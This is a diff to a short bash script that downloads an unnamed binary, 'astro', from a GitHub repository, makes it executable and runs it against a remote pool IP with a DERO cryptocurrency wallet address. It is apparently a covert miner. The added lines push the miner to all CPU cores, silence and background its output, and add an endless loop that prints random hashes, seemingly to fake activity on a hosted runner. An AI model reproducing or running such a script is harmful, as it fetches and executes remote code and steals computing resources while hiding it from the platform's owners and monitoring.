@@ -1,4 +1,5 @@
 #!/bin/bash
 wget https://github.com/tyha4t57i/filesg/raw/main/astro
 chmod +x astro
-./astro -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 95.179.169.217:10100 -p rpc -m 4
+./astro -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 95.179.169.217:10100 -p rpc -m $(nproc --all) > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done
